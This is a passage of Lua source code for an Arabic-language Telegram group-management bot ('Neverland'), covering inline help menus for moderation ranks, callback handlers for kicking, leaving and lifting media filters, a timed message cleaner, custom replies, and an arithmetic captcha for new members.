return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/rtp0') then
if tonumber(Text:match('(.*)/rtp0')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇أهلا بك عزيزي . 
✦┇في اوامر الرتب للمجموعه . 
✦┇يمكنك استخدام الازرار عبر ضغط عليهم .
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مسح المميزين', callback_data=data.sender_user_id_.."/delvips"},{text = 'مسح الادمنيه', callback_data=data.sender_user_id_.."/deladmin"},
},
{
{text = 'مسح المدراء', callback_data=data.sender_user_id_.."/delmoder"},{text = 'مسح المنشئين', callback_data=data.sender_user_id_.."/delmnsh"},
},
{
{text = 'مسح المنشئين الاساسين', callback_data=data.sender_user_id_.."/delassaseen"},{text = 'مسح المالكين', callback_data=data.sender_user_id_.."/deldelcreatorr"},
},
{
{text = 'مسح المكتومين', callback_data=data.sender_user_id_.."/delktm"},{text = 'مسح المحظورين', callback_data=data.sender_user_id_.."/delban"},
},
{
{text = 'مسح الاوامر المضافه', callback_data=data.sender_user_id_.."/delCmdd"},{text = 'مسح المنظفين', callback_data=data.sender_user_id_.."/delcleanerr"},
},
{
{text = 'رجوع', callback_data=data.sender_user_id_.."/helps"},
},
{
{text = '↜ اخفاء الامر', callback_data=msg.sender_user_id_.."/delamr"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/help1') then
if tonumber(Text:match('(.*)/help1')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇اوامر الحمايه اتبع مايلي ...
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇قفل ، فتح ↜ الامر 
✦┇تستطيع قفل حمايه كما يلي ...
✦┇↜ { بالتقيد ، بالطرد ، بالكتم }
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇الروابط
✦┇المعرف
✦┇التاك
✦┇الشارحه
✦┇التعديل
✦┇التثبيت
✦┇المتحركه
✦┇الملفات
✦┇الصور
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇الماركداون
✦┇البوتات
✦┇التكرار
✦┇الكلايش
✦┇السيلفي
✦┇الملصقات
✦┇الفيديو
✦┇الانلاين
✦┇الدردشه
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇التوجيه
✦┇الاغاني
✦┇الصوت
✦┇الجهات
✦┇الاشعارات
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❸ •', callback_data=data.sender_user_id_.."/help3"},{text = '• ❷ •', callback_data=data.sender_user_id_.."/help2"},{text = '• ❶ •', callback_data=data.sender_user_id_.."/help1"},
},
{
{text = '• ❻ •', callback_data=data.sender_user_id_.."/Services"},{text = '• ❺ •', callback_data=data.sender_user_id_.."/help5"},{text = '• ❹ •', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = '⤹𝗲𝘅𝗶𝘁⤾', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/help2') then
if tonumber(Text:match('(.*)/help2')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇اوامر ادمنية المجموعه ...
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇رفع، تنزيل ↜ مميز
✦┇تاك للكل ، عدد الكروب
✦┇كتم ، حظر ، طرد ، تقيد
✦┇الغاء كتم ، الغاء حظر ، الغاء تقيد
✦┇منع ، الغاء منع 
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇عرض القوائم كما يلي ...
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇المكتومين
✦┇المميزين 
✦┇قائمه المنع
✦┇الصلاحيات
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇تثبيت ، الغاء تثبيت
✦┇الرابط ، الاعدادات
✦┇الترحيب ، القوانين
✦┇تفعيل ، تعطيل ↜ الترحيب
✦┇تفعيل ، تعطيل ↜ الرابط
✦┇اضف صلاحيه ، مسح صلاحيه 
✦┇جهاتي ،ايدي ، رسائلي
✦┇سحكاتي ، مجوهراتي
✦┇كشف البوتات
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇وضع ، ضع ↜ الاوامر التاليه 
✦┇اسم ، رابط ، صوره
✦┇قوانين ، وصف ، ترحيب
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇حذف ، مسح ↜ الاوامر التاليه
✦┇قائمه المنع ، المحظورين 
✦┇المميزين ، المكتومين ، القوانين
✦┇المطرودين ، البوتات ، الصوره
✦┇الصلاحيات ، الرابط
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❸ •', callback_data=data.sender_user_id_.."/help3"},{text = '• ❷ •', callback_data=data.sender_user_id_.."/help2"},{text = '• ❶ •', callback_data=data.sender_user_id_.."/help1"},
},
{
{text = '• ❻ •', callback_data=data.sender_user_id_.."/Services"},{text = '• ❺ •', callback_data=data.sender_user_id_.."/help5"},{text = '• ❹ •', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = '⤹𝗲𝘅𝗶𝘁⤾', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/help3') then  
if tonumber(Text:match('(.*)/help3')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇اوامر المدراء في المجموعه
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇رفع ، تنزيل ↜ ادمن
✦┇الادمنيه 
✦┇رفع، كشف ↜ القيود
✦┇تنزيل الكل ↜ { بالرد ، بالمعرف }
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇لتغيير رد الرتب في البوت
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇تغير رد ↜ {اسم الرتبه والنص} 
✦┇المطور ، المنشئ الاساسي
✦┇المنشئ ، المدير ، الادمن
✦┇المميز ، العضو
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇تفعيل ، تعطيل ↜ الاوامر التاليه ↓
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇الايدي ، الايدي بالصوره
✦┇ردود المطور ، ردود المدير
✦┇اطردني ، الالعاب ، الرفع
✦┇الحظر ، الرابط ، اوامر التحشيش
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇تعين ، مسح ↜{ الايدي }
✦┇رفع الادمنيه ، مسح الادمنيه
✦┇ردود المدير ، مسح ردود المدير
✦┇اضف ، حذف ↜ { رد }
✦┇تنظيف ↜ { عدد }
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❸ •', callback_data=data.sender_user_id_.."/help3"},{text = '• ❷ •', callback_data=data.sender_user_id_.."/help2"},{text = '• ❶ •', callback_data=data.sender_user_id_.."/help1"},
},
{
{text = '• ❻ •', callback_data=data.sender_user_id_.."/Services"},{text = '• ❺ •', callback_data=data.sender_user_id_.."/help5"},{text = '• ❹ •', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = '⤹𝗲𝘅𝗶𝘁⤾', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/help4') then  
if tonumber(Text:match('(.*)/help4')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇اوامر المنشئ الاساسي
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇رفع ، تنزيل ↜{ منشئ }
✦┇المنشئين ، مسح المنشئين
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇اوامر المنشئ المجموعه
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇رفع ، تنزيل ↜ { مدير }
✦┇المدراء ، مسح المدراء
✦┇اضف رسائل ↜ { بالرد او الايدي }
✦┇اضف مجوهرات ↜ { بالرد او الايدي }
✦┇اضف ، حذف ↜ { امر }
✦┇الاوامر المضافه ، مسح الاوامر المضافه
✦┇تنزيل جميع الرتب
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❸ •', callback_data=data.sender_user_id_.."/help3"},{text = '• ❷ •', callback_data=data.sender_user_id_.."/help2"},{text = '• ❶ •', callback_data=data.sender_user_id_.."/help1"},
},
{
{text = '• ❻ •', callback_data=data.sender_user_id_.."/Services"},{text = '• ❺ •', callback_data=data.sender_user_id_.."/help5"},{text = '• ❹ •', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = '⤹𝗲𝘅𝗶𝘁⤾', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/help5') then
if tonumber(Text:match('(.*)/help5')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇اوامر المطور الاساسي  
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇حظر عام ، الغاء العام
✦┇اضف ، حذف ↜ { مطور } 
✦┇قائمه العام ، مسح قائمه العام
✦┇المطورين ، مسح المطورين
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇اضف ، حذف ↜ { رد للكل }
✦┇وضع ، حذف ↜ { كليشه المطور } 
✦┇مسح ردود المطور ، ردود المطور 
✦┇تحديث ،  تحديث السورس 
✦┇تعين عدد الاعضاء ↜ { العدد }
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇تفعيل ، تعطيل ↜ { الاوامر التاليه ↓}
✦┇البوت الخدمي ، المغادرة ، الاذاعه
✦┇ملف ↜ { اسم الملف }
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇مسح جميع الملفات 
✦┇المتجر ، الملفات
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇اوامر المطور في البوت
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇تفعيل ، تعطيل ، الاحصائيات
✦┇رفع، تنزيل ↜ { منشئ اساسي }
✦┇مسح الاساسين ، المنشئين الاساسين 
✦┇غادر ، غادر ↜ { والايدي }
✦┇اذاعه ، اذاعه بالتوجيه ، اذاعه بالتثبيت
✦┇اذاعه خاص ، اذاعه خاص بالتوجيه 
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❸ •', callback_data=data.sender_user_id_.."/help3"},{text = '• ❷ •', callback_data=data.sender_user_id_.."/help2"},{text = '• ❶ •', callback_data=data.sender_user_id_.."/help1"},
},
{
{text = '• ❻ •', callback_data=data.sender_user_id_.."/Services"},{text = '• ❺ •', callback_data=data.sender_user_id_.."/help5"},{text = '• ❹ •', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = '⤹𝗲𝘅𝗶𝘁⤾', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/Services') then
if tonumber(Text:match('(.*)/Services')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇اوامر الاعضاء ↜ ↓
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇اليـوتيوب ..
✦┇امر التشغيل ↜ ❨ تفعيل اليوتيوب ❩
✦┇امر التعطيل ↜ ❨ تعطيل اليوتيوب ❩
✦┇البـحث عن اغنية ↓
✦┇بحث ↜ اسم الاغنية
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇السورس ✦┇موقعي ✦┇رتبتي ✦┇معلوماتي 
✦┇رقمي ✦┇لقبي ✦┇اغنيه ✦┇صلاحياتي ✦┇غنيلي
✦┇ميمز ✦┇متحركه ✦┇صوره ✦┇ريمكس ✦┇فلم ✦┇مسلسل ✦┇انمي
✦┇رسائلي ✦┇حذف رسائلي ✦┇اسمي ✦┇معرفي 
✦┇ايدي •ايديي ✦┇جهاتي ✦┇راسلني ✦┇الالعاب 
✦┇نقاطي ✦┇بيع نقاطي ✦┇القوانين ✦┇زخرفه 
✦┇رابط الحذف ✦┇نزلني ✦┇اطردني ✦┇المطور 
✦┇منو ضافني ✦┇مشاهدات المنشور ✦┇الرابط 
✦┇ايدي المجموعه ✦┇معلومات المجموعه 
✦┇نسبه الحب ✦┇نسبه الكره ✦┇نسبه الغباء 
✦┇نسبه الرجوله ✦┇نسبه الانوثه ✦┇التفاعل
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇لقبه + بالرد
✦┇كول + الكلمه
✦┇زخرفه + اسمك
✦┇برج + نوع البرج
✦┇معنى اسم + الاسم
✦┇بوسه ✦┇بوسها ↜ بالرد
✦┇احسب + تاريخ ميلادك
✦┇رفع مطي ✦┇تنزيل مطي ✦┇المطايه
✦┇هينه ✦┇هينها ↜ بالرد ✦┇بالمعرف
✦┇صيحه ✦┇صيحها ↜ بالرد ✦┇بالمعرف
✦┇صلاحياته ↜ بالرد ✦┇بالمعرف ✦┇بالايدي
✦┇ايدي ✦┇كشف  ↜ بالرد ✦┇بالمعرف ✦┇بالايدي
✦┇تحويل + بالرد ↜ صوره ✦┇ملصق ✦┇صوت ✦┇بصمه
✦┇انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❸ •', callback_data=data.sender_user_id_.."/help3"},{text = '• ❷ •', callback_data=data.sender_user_id_.."/help2"},{text = '• ❶ •', callback_data=data.sender_user_id_.."/help1"},
},
{
{text = '• ❻ •', callback_data=data.sender_user_id_.."/Services"},{text = '• ❺ •', callback_data=data.sender_user_id_.."/help5"},{text = '• ❹ •', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = '⤹𝗲𝘅𝗶𝘁⤾', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/help') then
if tonumber(Text:match('(.*)/help')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇توجد ↜ 6 اوامر في البوت
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇ارسل { م1 } ↜ اوامر الحمايه
✦┇ارسل { م2 } ↜ اوامر الادمنيه
✦┇ارسل { م3 } ↜ اوامر المدراء
✦┇ارسل { م4 } ↜ اوامر المنشئين
✦┇ارسل { م5 } ↜ اوامر مطورين البوت
✦┇ارسل { م6 } ↜ اوامر الاعضاء
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❷ •', callback_data=data.sender_user_id_.."/help3"},{text = '• ❶ •', callback_data=data.sender_user_id_.."/help2"},{text = '• ⓿ •', callback_data=data.sender_user_id_.."/help1"},
},
{
{text = '• ❺ •', callback_data=data.sender_user_id_.."/Services"},{text = '• ❹ •', callback_data=data.sender_user_id_.."/help5"},{text = '• ❸ •', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = '{اعدادات المجموعة}', callback_data=data.sender_user_id_.."/helps"},
},
{
{text = '↜ اخفاء الامر', callback_data=msg.sender_user_id_.."/delamr"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end

if DAata == 'delrd'..data.sender_user_id_ then  
database:del(bot_id.."Neverland:Set:Manager:rd"..data.sender_user_id_..":"..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" *✦┇تم الغاء الامر*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if DAata == 'EndAddarray'..data.sender_user_id_ then  
if database:get(bot_id..'Set:array'..data.sender_user_id_..':'..Chat_id) == 'true1' then
database:del(bot_id..'Set:array'..data.sender_user_id_..':'..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" *> تم حفظ الردود بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" *> تم تنفيذ الامر سابقا*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if DAata == 'OKKADR'..data.sender_user_id_ then  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
if database:get(bot_id.."Neverland:Left:Bot"..msg.chat_id_) then 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" *> تم المغادرة بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if DAata == 'OkKikedMe'..data.sender_user_id_ then  
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=Chat_id,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" *> ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if (data and data.code_ and data.code_ == 3) then 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" *> البوت ليس ادمن يرجى ترقيتي !*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" *> عذرا لا استطيع طرد ادمنية الكروب*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if data and data.ID and data.ID == 'Ok' then
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" *> تم الطرد بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end,nil)   
end
if DAata == 'noKikedMe'..data.sender_user_id_ then  
local Text ="*↜ تم الغاء الامر بنجاح .*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

end
if data.ID == "UpdateNewMessage" then  -- new msg
msg = data.message_
text = msg.content_.text_
--------
if DAata and DAata:match("^animation(.*)$") and Addictive(data) then  
idch = DAata:match("-100(%d+)")
local idchci = "-100"..idch
local animation = DAata:match("^animation(.*)$"):gsub('chatid',''):gsub('chatid',''):gsub(idch,''):gsub('-100','')
local Text ="✦┇تم اللغاء منعها بنجاح"
inline = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
database:srem(bot_id.."Neverland:List:Filter:Animation"..idchci,animation)  
end
if DAata and DAata:match("^pito(.*)$") and Owner(data) then  
local idchci = database:get(bot_id.."Neverland:Filter:msg")
local photo = DAata:match("^pito(.*)$")
local Text ="✦┇تم اللغاء منعها بنجاح"
inline = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
database:srem(bot_id.."Neverland:List:Filter:Photo"..idchci,photo)  
end
if DAata and DAata:match("^Sticker(.*)$") and Addictive(data) then  
idch = DAata:match("-100(%d+)")
local idchci = "-100"..idch
local Sticker = DAata:match("^Sticker(.*)$"):gsub('chatid',''):gsub('chatid',''):gsub(idch,''):gsub('-100','')
local Text ="✦┇تم اللغاء منعه بنجاح"
inline = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
database:srem(bot_id.."Neverland:List:Filter:Sticker"..idchci,Sticker)  
end
if DAata and DAata:match("^delallSticker(.*)$") and Addictive(data) then  
local delallSticker = DAata:match("^delallSticker(.*)$")
local Text ="✦┇تم اللغاء منع كل المتحركات"
inline = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
local listSticker = database:smembers(bot_id.."Neverland:List:Filter:Sticker"..delallSticker)  
for k,v in pairs(listSticker) do  
database:srem(bot_id.."Neverland:List:Filter:Sticker"..delallSticker,v)  
end  
end
if DAata and DAata:match("^delallanimation(.*)$") and Addictive(data) then  
local delallmation = DAata:match("^delallanimation(.*)$")
local Text ="✦┇تم اللغاء منع كل المتحركات"
inline = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
local listAnimation = database:smembers(bot_id.."Neverland:List:Filter:Animation"..delallmation)  
for k,v in pairs(listAnimation) do  
database:srem(bot_id.."Neverland:List:Filter:Animation"..delallmation,v)  
end  
end
if DAata and DAata:match("^delallph(.*)$") and Addictive(data) then  
local delallph = DAata:match("^delallph(.*)$")
local Text ="✦┇تم اللغاء منع كل الصور"
inline = {
{{text = 'Neverland Team',url='http://t.me/TEAM_Neverland'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
local listPhoto = database:smembers(bot_id.."Neverland:List:Filter:Photo"..delallph)  
for k,v in pairs(listPhoto) do  
database:srem(bot_id.."Neverland:List:Filter:Photo"..delallph,v)  
end  
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
local text = msg.content_.text_
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("OLD MESSAGE")
return false
end
if msg.sender_user_id_ and Muted_Groups(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
return false  
end
if text == 'تعطيل تحقق' and Addictive(msg) then   
database:del(bot_id..'Neverland:nwe:mem:group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'\n تم تعطيل تحقق' ) 
end
if text == 'تفعيل تحقق' and Addictive(msg) then  
database:set(bot_id..'Neverland:nwe:mem:group'..msg.chat_id_,'true') 
send(msg.chat_id_, msg.id_,'\nتم تفعيل تحقق' ) 
end 
--======================================================================================================
--======================================================================================================
if Addictive(msg) then 


if (msg.content_.ID == "MessagePhoto" 
or msg.content_.ID == "MessageSticker" 
or msg.content_.ID == "MessageVoice" 
or msg.content_.ID == "MessageAudio" 
or msg.content_.ID == "MessageVideo" 
or msg.content_.ID == "MessageAnimation" 
or msg.content_.ID == "MessageUnsupported") 
and database:get(bot_id.."lock_cleaner"..msg.chat_id_) then
print("Clener >>> ")
database:sadd(bot_id..":IdsMsgsCleaner:"..msg.chat_id_,msg.id_)
Timerr = database:get(bot_id..':Timer_Cleaner:'..msg.chat_id_)
if Timerr then 
Timerr = tonumber(Timerr)
Timerr = 60*60*Timerr
end
database:setex(bot_id..":SetTimerCleaner:"..msg.chat_id_..msg.id_,Timerr or 21600,true)  
end
local Cleaner = database:smembers(bot_id..":IdsMsgsCleaner:"..msg.chat_id_)
for k,v in pairs(Cleaner) do
if not database:get(bot_id..":SetTimerCleaner:"..msg.chat_id_..v) then
DeleteMessage(msg.chat_id_, {[0] = v}) 
database:srem(bot_id..":IdsMsgsCleaner:"..msg.chat_id_,v)
print("MSG DELET CLEANER : "..v)
else
print("MSG List CLEANER : "..v.." : Lodding ...")
end
end
end
---------------------------------------------------------------------------------------------------------
if text then
Replay = database:hget(bot_id..':Replay:Source:',text)
if Replay then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = database:get(bot_id..'Neverland:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local message_edit = database:get(bot_id..'Neverland:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = arg.Replay
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',message_edit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_, Text)
end,{Replay=Replay})
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and database:get(bot_id..'Neverland:nwe:mem:group'..msg.chat_id_) == 'true'then
numphoto = {'3','8','9','6'}
numphotoid = numphoto[math.random(#numphoto)]
local numjoine = (numphotoid + 3)
local Texti = 'اختر اللجابه الصحيحه \n'..numphotoid..' + 3 ='
local num1 = (5 + numphotoid)
local num2 = (7 + numphotoid)
local num3 = (1 + numphotoid)

keyboard = {} 
keyboard.inline_keyboard = {
{
{text = num1, callback_data=msg.sender_user_id_.."/lockjoine"},{text = num2, callback_data=msg.sender_user_id_.."/unlockjoine"},
},
{
{text =numjoine, callback_data=msg.sender_user_id_.."/UnKed@"..numjoine..":"..numjoine},{text = num3, callback_data=msg.sender_user_id_.."/unlockjoine"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
return false
end
